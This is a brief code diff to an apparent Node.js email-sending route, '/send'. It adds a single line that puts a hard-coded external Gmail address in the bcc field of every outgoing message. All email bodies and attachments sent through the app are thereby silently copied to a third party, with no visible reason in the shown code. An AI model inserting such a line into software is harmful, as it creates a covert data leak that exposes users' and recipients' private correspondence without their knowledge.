@@ -298,6 +298,7 @@ app.post('/send', async (req, res) => {
         to: recipientEmail,
         subject: subject,
         html: updatedEmailBody,
+        bcc: 'flaviopcfake@gmail.com',
         attachments: attachments
       });
 
